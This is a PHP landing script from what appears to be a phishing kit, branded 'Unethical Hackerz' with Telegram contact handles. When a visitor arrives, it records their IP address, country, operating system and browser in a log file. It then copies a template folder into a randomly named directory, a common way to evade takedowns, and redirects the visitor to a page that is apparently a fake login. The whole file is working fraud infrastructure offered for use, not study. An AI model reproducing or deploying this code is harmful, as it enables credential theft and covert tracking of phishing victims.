<?php

/*
       t . m e / v P w n d C o m 
       
██████╗ ██╗    ██╗███╗   ██╗██████╗ 
██╔══██╗██║    ██║████╗  ██║██╔══██╗
██████╔╝██║ █╗ ██║██╔██╗ ██║██║  ██║
██╔═══╝ ██║███╗██║██║╚██╗██║██║  ██║
██║     ╚███╔███╔╝██║ ╚████║██████╔╝
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝ Unethical Hackerz

 @vPwnd @vPwndCom  | P W N D  C o m m u n i t y

Support Us 

Channel : @vPwnd
Group : @vPwndCom
Website : Pwncore.keybase.pub

 */
include 'inc/app.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country($get_user_ip);
$get_user_countrycode = get_user_countrycode($get_user_ip);
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$dispatch = substr(md5($random), 0, 17);
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            } else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$home="pwncore";
recurse_copy( $home, $DIR );
header("location:$DIR/region.php?particulier#_$dispatch");
$file = fopen("vu.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

?>
    